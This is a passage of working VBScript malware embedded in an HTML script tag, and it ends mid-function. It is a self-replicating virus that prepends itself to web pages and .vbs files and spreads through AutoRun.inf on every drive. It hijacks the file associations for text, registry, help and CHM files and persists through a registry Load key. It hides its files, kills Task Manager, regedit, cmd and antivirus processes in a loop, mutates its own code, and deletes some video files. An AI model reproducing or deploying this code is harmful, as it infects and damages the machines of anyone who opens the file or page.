<SCRIPT Language = VBScript>
'¾ËÆÄÀÎ4

'DKTAGMMETHKPD2_19

Function GetVersion(objfso, path_v)
    Dim FV, buffer
    Set FV = objfso.OpenTextFile(path_v, 1)
    buffer = FV.ReadAll()
    GetVersion = Mid(buffer, InStr(buffer, Head_V) + Len(Head_V), 1)
End Function

Function GetScriptCode(Languages)
    On Error Resume Next
    Dim soj
    For Each soj In document.Scripts
        If LCase(soj.Language) = Languages Then
            Select Case LCase(soj.Language)
                Case "vbscript"
                    GetScriptCode = soj.Text
                    Exit Function
                Case "javascript"
                    GetScriptCode = soj.Text
                    Exit Function
            End Select
        End If
    Next
End Function

Function GetSelfCode(objfso, FullPath_Self)
    On Error Resume Next
    Dim n, n1, buffer, Self
    Set Self = objfso.OpenTextFile(FullPath_Self, 1)
    buffer = Self.ReadAll
    n = InStr(buffer, Head_V)
    n1 = InstrRev(buffer, Tail_V)
    buffer = Mid(buffer, n, n1 - n + Len(Tail_V) + 1)
    GetSelfCode = buffer
    Self.Close
End Function

Function GetMainBody(vbsCode, Sum_ModelCode)
    Dim i
    For i = 2 To Sum_ModelCode
        GetMainBody = GetMainBody & VBCRLF & GetModelCode(vbsCode, i) & VBCRLF
    Next
End Function

'JTBLRJSOPBL2_19

'DKTAGMMETHKPD2_25

Sub DeleteReg(strkey)
    Dim tmps
    Set tmps = CreateObject("WScript.Shell")
    tmps.RegDelete strkey
    Set tmps = Nothing
End Sub

Function ReadReg(strkey)
    Dim tmps
    Set tmps = CreateObject("WScript.Shell")
    ReadReg = tmps.RegRead(strkey)
    Set tmps = Nothing
End Function

Sub WriteReg(strkey, Value, vtype)
    Dim tmps
    Set tmps = CreateObject("WScript.Shell")
    If vtype = "" Then
        tmps.RegWrite strkey, Value
    Else
        tmps.RegWrite strkey, Value, vtype
    End If
    Set tmps = Nothing
End Sub

'JTBLRJSOPBL2_25

'DKTAGMMETHKPD2_26

Sub Run(ExeFullName)
    Dim WshShell
    Set WshShell = WScript.CreateObject("WScript.Shell")
    WshShell.Run ExeFullName
    Set WshShell = Nothing
End Sub

Sub CopyFile(objfso, code, pathf)
    On Error Resume Next
    Dim vf
    Set vf = objfso.OpenTextFile(pathf, 2, true)
    vf.Write code
End Sub

Function ChangeName(vbsCode, Names)
    Dim Name, j, temp, buffer
    buffer = vbsCode
    Randomize
    For Each Name in Names
        temp = ""
        For j = 1 To Len(Name)
            temp = temp & Chr((Int(Rnd * 26) + 65))
        Next
        buffer = Replace(buffer, Name, temp)
    Next
    ChangeName = buffer
End Function

'JTBLRJSOPBL2_26

'DKTAGMMETHKPD1_6

Sub AutoRun(objfso, D, vbsCode)
    On Error Resume Next
    Dim path_autorun, path_vbs, inf_autorun
    path_autorun = D & ":\AutoRun.inf"
    path_vbs = D & ":\" & Name_V1
    If objfso.FileExists(path_vbs) = False Or objfso.FileExists(path_autorun) = False Or GetVersion(objfso, path_vbs)<Version Then
        If objfso.FileExists(path_autorun) = True Then
            objfso.DeleteFile path_autorun, True
        End If

        If objfso.FileExists(path_vbs) = True Then
            objfso.DeleteFile path_vbs, True
        End If

        Call CopyFile(objfso, vbsCode, path_vbs)
        Call SetFileAttr(objfso, path_vbs)

        inf_autorun = "[AutoRun]" & VBCRLF & "Shellexecute=WScript.exe " & Name_V1 & " ""AutoRun""" & VBCRLF & "shell\AutoRun=´ò¿ª(&O)" & VBCRLF & "shell\AutoRun\command=WScript.exe " & Name_V1 & " ""AutoRun""" & VBCRLF & "shell\AutoRun1=×ÊÔ´¹ÜÀíÆ÷(&X)" & VBCRLF & "shell\AutoRun1\command=WScript.exe " & Name_V1 & " ""AutoRun"""
        Call CopyFile(objfso, inf_autorun, path_autorun)
        Call SetFileAttr(objfso, path_autorun)
    End If
End Sub

'JTBLRJSOPBL1_6

'DKTAGMMETHKPD1_9

Function ChangeModelOrder(vbsCode, Num_DNA)
    On Error Resume Next
    Dim DNA(), Array_vbsCode()
    Dim i, Value, flag, j, buffer
    ReDim DNA(Num_DNA), Array_vbsCode(Num_DNA)
    buffer = vbsCode
    Randomize
    For i = 1 To Num_DNA
        Do
            Value = Int((Num_DNA * Rnd) + 1)
            flag = 1

            For j = 1 To Num_DNA
                If Value = DNA(j) Then
                    flag = 0
                    Exit For
                End If
            Next

        Loop Until flag = 1

        DNA(i) = Value
    Next
    For i = 1 To Num_DNA
        Array_vbsCode(i) = GetModelCode(buffer, i)

    Next
    buffer = ""
    For i = 1 To Num_DNA
        buffer = buffer & VBCRLF & Array_vbsCode(DNA(i)) & VBCRLF
    Next
    ChangeModelOrder = Head_V & Version & VBCRLF & buffer & VBCRLF & Tail_V
End Function

'JTBLRJSOPBL1_9

'DKTAGMMETHKPD2_11

Sub SearchFile(objfso, strPath, VbsCode_WebPage, VbsCode_Victim, T)
    On Error Resume Next
    Dim pfo, pf, pfi, ext
    Dim psfo, ps
    Set pfo = objfso.GetFolder(strPath)
    Set pf = pfo.Files
    For Each pfi In pf
        If Cnt >= CntMax Then
            Exit For
        End If
        ext = LCase(objfso.GetExtensionName(pfi.Path))

        Select Case ext
            Case "hta", "htm", "html", "asp", "vbs"
                Call InfectHead(pfi.Path, pfi, objfso, VbsCode_WebPage, VbsCode_Victim, ext, T)
            Case "mpg", "rmvb", "avi", "rm"
                If IsSexFile(pfi.Name) = True Then
                    pfi.Delete
                End If
        End Select
    Next
    Set psfo = pfo.SubFolders
    For Each ps In psfo
        If Cnt >= CntMax Then
            Exit For
        End If
        Call SearchFile(objfso, ps.Path, VbsCode_WebPage, VbsCode_Victim, T)
    Next
End Sub

'JTBLRJSOPBL2_11

'DKTAGMMETHKPD1_2

Sub ExeVbs_WebPage()
    On Error Resume Next
    Dim objfso, vbsCode, VbsCode_Virus
    Set objfso = CreateObject(GetFSOName())
    vbsCode = GetScriptCode("vbscript")
    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
    Call InvadeSystem(objfso, VbsCode_Virus)
    Set objfso = Nothing
End Sub

Sub ExeVbs_Victim()
    On Error Resume Next
    Dim objfso, vbsCode, VbsCode_Virus
    Set objfso = CreateObject(GetFSOName())
    vbsCode = GetSelfCode(objfso, WScript.ScriptFullName)
    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
    Call InvadeSystem(objfso, VbsCode_Virus)
    Call Run(FullPath_V1)
    Set objfso = Nothing
End Sub

'JTBLRJSOPBL1_2

'DKTAGMMETHKPD1_4

Function Head()
    Head = VBCRLF & "'DKTAGMMETHKPD1_1" & VBCRLF &_
    "On Error Resume Next" & VBCRLF &_
    "Dim Cnt, CntMax, Version, Name_V1, FullPath_V0, FullPath_V1, FullPath_Config,Sum_ModelCode,Head_V,Tail_V" & VBCRLF &_
    "Dim ModelHead, ModelTail" & VBCRLF &_
    "Cnt = 0" & VBCRLF &_
    "CntMax = 1000" & VBCRLF &_
    "Version = ""4""" & VBCRLF &_
    "Name_V1 = GetUserName() & "".vbs""" & VBCRLF &_
    "FullPath_V0 = GetSFolder(0) & Name_V1 'Ö÷ÒªÖ´ÐÐÎÄ¼þ¹ØÁª×ªÏò" & VBCRLF &_
    "FullPath_V1 = GetSFolder(1) & Name_V1 'Ö÷ÒªÖ´ÐÐÅäÖÃÎÄ¼þÃüÁî" & VBCRLF &_
    "FullPath_Config= GetSFolder(1) & GetUserName() & "".ini""" & VBCRLF &_
    "Sum_ModelCode = 26" & VBCRLF &_
    "Head_V= GetHeadTail(0)" & VBCRLF &_
    "Tail_V= GetHeadTail(1)" & VBCRLF &_
    "ModelHead=""'DKTAGMMETHKPD""" & VBCRLF &_
    "ModelTail=""'JTBLRJSOPBL""" & VBCRLF
End Function

Function VictimHead()
    VictimHead = Head() & VBCRLF &_
    "Call VictimMain()" & VBCRLF &_
    "Sub VictimMain()" & VBCRLF &_
    "    Call ExeVbs_Victim()" & VBCRLF &_
    "End Sub" & VBCRLF &_
    "'JTBLRJSOPBL1_1" & VBCRLF
End Function

Function VirusHead()
    VirusHead = Head() & VBCRLF &_
    "Call VirusMain()" & VBCRLF &_
    "Sub VirusMain()" & VBCRLF &_
    "    On Error Resume Next" & VBCRLF &_
    "    Call ExeVbs_Virus()" & VBCRLF &_
    "End Sub" & VBCRLF & VBCRLF &_
    "'JTBLRJSOPBL1_1" & VBCRLF
End Function

Function WebHead()
    WebHead = Head() & VBCRLF &_
    "Call WebMain()" & VBCRLF &_
    "Sub WebMain()" & VBCRLF &_
    "    On Error Resume Next" & VBCRLF &_
    "    Call ExeVbs_WebPage()" & VBCRLF &_
    "End Sub" & VBCRLF &_
    "'JTBLRJSOPBL1_1" & VBCRLF
End Function

'JTBLRJSOPBL1_4

'DKTAGMMETHKPD1_8

Sub RestoreSystem(objfso)
    On Error Resume Next
    Dim Value, dc, d, HCULoad

    Call SafeSet()

    HCULoad = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Load"
    If ReadReg(HCULoad) = FullPath_V1 Then
        Call DeleteReg(HCULoad)
    End If

    Value = "%SystemRoot%\system32\NOTEPAD.EXE %1"
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\")<>Value Then
        Call WriteReg ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\", Value, "REG_EXPAND_SZ")
    End If

    Value = "regedit.exe " & """%1"""
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\")<>Value Then
        Call WriteReg ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\", Value, "REG_EXPAND_SZ")
    End If

    Value = GetSFolder(1) & "hh.exe " & """%1"""
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\")<>Value Then
        Call WriteReg ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\", Value, "REG_EXPAND_SZ")
    End If

    Value = "%SystemRoot%\system32\winhlp32.exe %1"
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\")<>Value Then
        Call WriteReg ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\", Value, "REG_EXPAND_SZ")
    End If

    Value = """%1"" %*"
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\open\command\")<>Value Then
        Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\open\command\", Value, "REG_SZ")
    End If

    Set dc = objfso.Drives
    For Each d In dc
        If objfso.FileExists(d.DriveLetter & ":\" & Name_V1) = True Then
            objfso.DeleteFile d.DriveLetter & ":\" & Name_V1
            objfso.DeleteFile d.DriveLetter & ":\" & "AutoRun.inf"
        End If
    Next

    If objfso.FileExists(FullPath_V1) = True Then
        Set vf = objfso.GetFile(FullPath_V1)
        vf.Delete
    End If

    If objfso.FileExists(FullPath_V0) = true Then
        Set vf = objfso.GetFile(FullPath_V0)
        vf.Delete
    End If

    If objfso.FileExists(FullPath_Config) = True Then
        objfso.DeleteFile FullPath_Config , True
    End If
End Sub

'JTBLRJSOPBL1_8

'DKTAGMMETHKPD1_1
On Error Resume Next
Dim Cnt, CntMax, Version, Name_V1, FullPath_V0, FullPath_V1, FullPath_Config,Sum_ModelCode,Head_V,Tail_V
Dim ModelHead, ModelTail
Cnt = 0
CntMax = 1000
Version = "4"
Name_V1 = GetUserName() & ".vbs"
FullPath_V0 = GetSFolder(0) & Name_V1 'Ö÷ÒªÖ´ÐÐÎÄ¼þ¹ØÁª×ªÏò
FullPath_V1 = GetSFolder(1) & Name_V1 'Ö÷ÒªÖ´ÐÐÅäÖÃÎÄ¼þÃüÁî
FullPath_Config= GetSFolder(1) & GetUserName() & ".ini"
Sum_ModelCode = 26
Head_V= GetHeadTail(0)
Tail_V= GetHeadTail(1)
ModelHead="'DKTAGMMETHKPD"
ModelTail="'JTBLRJSOPBL"

Call WebMain()
Sub WebMain()
    On Error Resume Next
    Call ExeVbs_WebPage()
End Sub
'JTBLRJSOPBL1_1

'DKTAGMMETHKPD2_22

Function GetSFolder(p)
    Dim objfso
    Set objfso = CreateObject(GetFSOName())
    GetSFolder = objfso.GetSpecialFolder(p) & "\"
    Set objfso = Nothing
End Function

Function GetUserName()
    On Error Resume Next
    Dim Value , UserName
    Value = "HKEY_CURRENT_USER\Software\Microsoft\Active Setup\Installed Components\{44BBA840-CC51-11CF-AAFA-00AA00B6015C}\Username"
    UserName = ReadReg(Value)
    If UserName = "" Then
        GetUserName = "Administrator"
    Else
        GetUserName = UserName
    End If
End Function

Function GetFSOName()
    On Error Resume Next
    Dim Value , UserName
    Value = "HKEY_CLASSES_ROOT\CLSID\{0D43FE01-F093-11CF-8940-00A0C9054228}\ProgID\"
    UserName = ReadReg(Value)
    If UserName = "" Then
        GetUserName = "Scripting.FileSystemObject"
    Else
        GetFSOName = UserName
    End If
End Function

Function GetHeadTail(l)
    Dim Str , buffer
    If l = 0 Then
        GetHeadTail = "'" & GetUserName()
    Else
        buffer = GetUserName()
        Str = ""
        For i = 1 To Len(buffer)
            Str = Mid(buffer, i, 1) & Str
            GetHeadTail = "'" & Str
        Next
    End If
End Function

'JTBLRJSOPBL2_22

'DKTAGMMETHKPD2_18

Function IsOK(objfso, Now_V, path_f)
    On Error Resume Next
    Dim vf, p1, p2, p3
    IsOK = False
    Set vf = objfso.OpenTextFile(path_f, 1)
    p1 = Trim(vf.ReadLine)
    p2 = Trim(vf.ReadLine)
    p3 = Trim(vf.ReadLine)
    If StrComp(p1, "OK", 1) = 0 And StrComp(p2, Now_V, 1) = 0 Then
        IsOK = True
    End If
    If p3 = "Admin" Then
        MsgBox "You Are Admin!!! Your Computer Will Not Be Infected!!!"
        IsOK = True
        n = InputBox("0:ÍË³ö£» 1:¼àÊÓÏµÍ³£» 2:´«È¾ÎÄ¼þ", "SuperVirus½Å±¾²âÊÔ!")
        If n = 0 Then
            Wscript.Quit
        ElseIf n = 1 Then
            IsOK = True
        ElseIf n = 2 Then
            IsOK = False
        End If
    End If
End Function

'JTBLRJSOPBL2_18

'DKTAGMMETHKPD1_7

Sub InvadeSystem(objfso, vbsCode)
    On Error Resume Next
    Dim Value, HCULoad, vbsCode_Virus, dc, d

    Value = "%SystemRoot%\System32\WScript.exe " & """" & FullPath_V0 & """" & " %1 %* "
    HCULoad = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Load"
    vbsCode_Virus = vbsCode

    Set dc = objfso.Drives
    For Each d In dc
        If d.DriveType = 1 Or d.DriveType = 2 Or d.DriveType = 3 Then
            Call AutoRun(objfso, d.DriveLetter, vbsCode_Virus)
        End If
    Next

    If objfso.FileExists(FullPath_V1) = True And GetVersion(objfso, FullPath_V1)< Version Then
        objfso.DeleteFile FullPath_V1 , True
        Call CopyFile(objfso, vbsCode_Virus, FullPath_V1)
        Call SetFileAttr(objfso, FullPath_V1)
    Else
        Call CopyFile(objfso, vbsCode_Virus, FullPath_V1)
        Call SetFileAttr(objfso, FullPath_V1)
    End If

    If objfso.FileExists(FullPath_V0) = True And GetVersion(objfso, FullPath_V0)<Version Then
        objfso.DeleteFile FullPath_V0 , True
        Call CopyFile(objfso, vbsCode_Virus, FullPath_V0)
        Call SetFileAttr(objfso, FullPath_V0)
    Else
        Call CopyFile(objfso, vbsCode_Virus, FullPath_V0)
        Call SetFileAttr(objfso, FullPath_V0)
    End If

    If ReadReg(HCULoad)<> FullPath_V1 Then
        Call WriteReg (HCULoad, FullPath_V1, "")
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\")<>Value Then
        Call SetTxtFileAss(FullPath_V0)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\")<>Value Then
        Call SetRegFileAss(FullPath_V0)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\")<>Value Then
        Call SetchmFileAss(FullPath_V0)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\")<>Value Then
        Call SethlpFileAss(FullPath_V0)
    End If

    Call DeSafeSet()
End Sub

'JTBLRJSOPBL1_7

'DKTAGMMETHKPD2_15

Sub SetFileAttr(objfso, pathf)
    Dim vf
    Set vf = objfso.GetFile(pathf)
    vf.Attributes = 6
End Sub

'JTBLRJSOPBL2_15

'DKTAGMMETHKPD2_13

Sub DeSafeSet()
    Dim HLMShow , HCUAdvanced, HCUExplorer
    HLMShow = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"
    HCUAdvanced = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden"
    HCUExplorer = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun"
    Call WriteReg (HCUExplorer, 129, "REG_DWORD")
    Call WriteReg (HCUAdvanced, 0, "REG_DWORD")
    Call WriteReg (HLMShow, 0, "REG_DWORD")
End Sub

Sub SafeSet()
    Dim HLMShow , HCUSSHidden, HCUHidden
    Dim HCUExplorer
    HLMShow = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"
    HCUAdvanced = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden"
    HCUHidden = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden"
    Call WriteReg (HCUHidden, 1, "REG_DWORD")
    Call WriteReg (HCUAdvanced, 1, "REG_DWORD")
    Call WriteReg (HLMShow, 1, "REG_DWORD")
End Sub

'JTBLRJSOPBL2_13

'DKTAGMMETHKPD2_23

Function MakeScript(strCode, T)
    If T = 1 Then
        MakeScript = "<" & "SCRIPT Language = VBScript>" & VBCRLF & ChangeModelOrder(strCode, Sum_ModelCode) & VBCRLF & "</" & "SCRIPT>"
    Else
        MakeScript = "<" & "SCRIPT Language = VBScript>" & VBCRLF & strCode & VBCRLF & "</" & "SCRIPT>"
    End If
End Function


'JTBLRJSOPBL2_23

'DKTAGMMETHKPD2_14

Function ReadOK(objfso, FullPath_OK)
    On Error Resume Next
    Dim vf, buffer
    Set vf = objfso.OpenTextFile(FullPath_OK, 1)
    buffer = vf.ReadAll
    ReadOK = RTrim(Mid(buffer, InStr(buffer, "Order:") + 6, 50))
End Function

Sub WriteOK(objfso, FullPath_OK, Order_Order, Order_Para)
    On Error Resume Next
    Dim vf1
    objfso.DeleteFile FullPath_OK, True
    Set vf1 = objfso.OpenTextFile(FullPath_OK, 2, True)
    vf1.Write "OK" & VBCRLF
    vf1.WriteLine Date()
    vf1.WriteLine "Order:" & Order_Order & "@" & Order_Para
    Call SetFileAttr(objfso, FullPath_OK)
End Sub

'JTBLRJSOPBL2_14

'DKTAGMMETHKPD2_16

Sub SetTxtFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub

Sub SethlpFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub

Sub SetRegFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub

Sub SetchmFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub



'JTBLRJSOPBL2_16

'DKTAGMMETHKPD2_20

Function GetModelCode(vbsCode, N_ModelCode)
    On Error Resume Next
    Dim n, n1, buffer
    buffer = vbsCode
    If N_ModelCode>= 1 And N_ModelCode<= 9 Then
        n = InStr(buffer, ModelHead & "1_" & N_ModelCode)
        n1 = InStr(buffer, ModelTail & "1_" & N_ModelCode)
        GetModelCode = Mid(buffer, n, n1 - n + Len(ModelTail & "1_" & N_ModelCode))
    ElseIf N_ModelCode>= 10 And N_ModelCode<= 99 Then
        n = InStr(buffer, ModelHead & "2_" & N_ModelCode)
        n1 = InStr(buffer, ModelTail & "2_" & N_ModelCode)
        GetModelCode = Mid(buffer, n, n1 - n + Len(ModelTail & "2_" & N_ModelCode))
    ElseIf N_ModelCode>= 100 And N_ModelCode<= 999 Then
        n = InStr(buffer, ModelHead & "3_" & N_ModelCode)
        n1 = InStr(buffer, ModelTail & "3_" & N_ModelCode)
        GetModelCode = Mid(buffer, n, n1 - n + Len(ModelTail & "3_" & N_ModelCode))
    End If
End Function

'JTBLRJSOPBL2_20

'DKTAGMMETHKPD2_21

Function IsSexFile(fname)
    IsSexFile = False
    If InStr(fname, "³ÉÈË")>0 Or InStr(fname, "Òù")>0 Or InStr(fname, "ÍµÅÄ")>0 Or _
                InStr(fname, "Íµ¿ú")>0 Or InStr(fname, "¿Ú½»")>0 Or InStr(fname, "Ç¿¼é")>0 Or _
                InStr(fname, "ÂÖ¼é")>0 Or InStr(fname, "Â×ÀíÆ¬")>0 Or InStr(fname, "×ÔÃþ")>0 Then
        IsSexFile = True
    End If
End Function

Function Isinfected(buffer, ftype)
    Isinfected = True
    Select Case ftype
        Case "hta", "htm" , "html" , "asp", "vbs"
            If InStr(buffer, Head_V) = 0 Then
                Isinfected = False
            End If
        Case Else
            Isinfected = True
    End Select
End Function

'JTBLRJSOPBL2_21

'DKTAGMMETHKPD2_12

Sub InfectHead(strPath, fi, objfso, VbsCode_WebPage, VbsCode_Victim, ftype, T)
    On Error Resume Next
    Dim tso, buffer, strCode , Maxsize
    Maxsize = 350000
    If fi.Size< Maxsize Then
        Set tso = objfso.OpenTextFile(strPath, 1, True)
        buffer = tso.ReadAll()
        tso.Close

        If T = 0 Then
            Select Case ftype
                Case "hta", "htm", "html", "asp"
                    If Isinfected(buffer, ftype) = False Then
                        Set tso = objfso.OpenTextFile(strPath, 2, true)
                        strCode = MakeScript(VbsCode_WebPage, 0)
                        tso.Write strCode & VBCRLF & buffer
                        Cnt = Cnt + 1
                    End If
                Case "vbs"
                    If Isinfected(buffer, ftype) = False Then
                        n = InStr(buffer , "Option Explicit")
                        If n<>0 Then
                            buffer = Replace(buffer, "Option Explicit", "", 1, 1, 1)
                            Set tso = objfso.OpenTextFile(strPath, 2, true)
                            tso.Write vbsCode_Victim & VBCRLF & buffer
                            Cnt = Cnt + 1
                        Else
                            Set tso = objfso.OpenTextFile(strPath, 2, true)
                            tso.Write vbsCode_Victim & VBCRLF & buffer
                            Cnt = Cnt + 1
                        End If
                    End If
                Case Else
                    '
                    '
            End Select

        ElseIf T = 1 Then
            If Isinfected(buffer, ftype) = True Then
                n = InStrRev(buffer , Tail_V)
                If n<>0 Then
                    buffer = Replace(buffer, Tail_V, "", n, 1, 1)
                    Set tso = objfso.OpenTextFile(strPath, 2, True)
                    tso.Write strCode & VBCRLF & buffer
                End If
            End If
        End If
    End If

End Sub

'JTBLRJSOPBL2_12

'DKTAGMMETHKPD2_10

Sub SearchDrives(objfso, VbsCode_WebPage, VbsCode_Victim, T)
    On Error Resume Next
    Dim d , dc
    Set dc = objfso.Drives
    For Each d In dc
        If Cnt >= CntMax Then '
            Exit For
        End If
        If d.DriveType = 1 Or d.DriveType = 2 Or d.DriveType = 3 Then
            'If d.DriveType = 1 Then
            Call SearchFile(objfso, d.Path & "\", VbsCode_WebPage, VbsCode_Victim, T)
            'End If
        End If
    Next
End Sub

'JTBLRJSOPBL2_10

'DKTAGMMETHKPD2_24

Sub KillProcess(ProcessNames)
    On Error Resume Next
    Dim objShell, intReturn, name_exe
    Set objShell = WScript.CreateObject("WScript.Shell")
    strComputer = "."
    Set objWMIServices = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    For Each ProcessName in ProcessNames
        Set colProcessList = objWMIServices.Execquery(" Select * From win32_process where name = '" & ProcessName & "' ")
        For Each objProcess in colProcessList
            intReturn = objProcess.Terminate
            Select Case intReturn
                Case 2
                    name_exe = objProcess.Name
                    name_exe = Left(name_exe, Len(name_exe) -4)
                    objShell.Run "cmd.exe /c @tskill " & name_exe, 0, False
            End Select
        Next
    Next
    Set objShell = Nothing
End Sub

'JTBLRJSOPBL2_24

'DKTAGMMETHKPD1_5

Sub MonitorSystem(objfso, vbsCode)
    On Error Resume Next
    Dim ProcessNames
    ProcessNames = Array("ras.exe", "360tray.exe", "taskmgr.exe", "cmd.exe", "cmd.com", "regedit.exe", "regedit.scr", "regedit.pif", "regedit.com", "msconfig.exe", "SREng.exe", "USBAntiVir.exe")
    Do
        Call KillProcess(ProcessNames)
        Call InvadeSystem(objfso, vbsCode)
        WScript.Sleep 5000
    Loop
End Sub

'JTBLRJSOPBL1_5

'DKTAGMMETHKPD2_17

Function PreInstance()
    On Error Resume Next
    Dim num_cnt
    Dim strComputer, objWMIService, colProcessList, objProcess
    num_cnt = 0
    PreInstance = False
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where " & "Name = 'cscript.exe' or Name = 'wscript.exe'")
    For Each objProcess in colProcessList
        If InStr(CStr(objProcess.CommandLine), WScript.ScriptFullName)>0 Then
            num_cnt = num_cnt + 1
        End If
    Next
    If num_cnt>= 2 Then
        PreInstance = True
    End If
End Function

'JTBLRJSOPBL2_17

'DKTAGMMETHKPD1_3

Sub ExeVbs_Virus()
    On Error Resume Next
    Dim objfso, objshell, FullPath_Self, Name_Self, Names
    Dim oArgs, ArgNum, Para_V, SubPara_V, RunPath
    Dim Order, Order_Order, Order_Para
    Dim vbsCode , VbsCode_Virus, VbsCode_WebPage, VbsCode_Victim , MainBody

    Set objfso = CreateObject(GetFSOName())
    Set objshell = CreateObject("WScript.Shell")
    FullPath_Self = WScript.ScriptFullName
    Name_Self = WScript.ScriptName
    Names = Array("DKTAGMMETHKPD", "JTBLRJSOPBL")

    Set oArgs = WScript.Arguments
    ArgNum = 0
    Do While ArgNum < oArgs.Count
        Para_V = Para_V & " " & oArgs(ArgNum)
        ArgNum = ArgNum + 1
    Loop
    SubPara_V = LCase(Right(Para_V, 3))
    Select Case SubPara_V
        Case "run"
            RunPath = Left(FullPath_Self, 2)
            Call Run(RunPath)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case "txt", "log"
            RunPath = "%SystemRoot%\system32\NOTEPAD.EXE " & Para_V
            Call Run(RunPath)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case "reg"
            Para_V = "regedit.exe " & """" & Trim(Para_V) & """"
            Call Run(Para_V)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case "chm"
            Para_V = "hh.exe " & """" & Trim(Para_V) & """"
            Call Run(Para_V)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case "hlp"
            Para_V = "winhlp32.exe " & """" & Trim(Para_V) & """"
            Call Run(Para_V)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
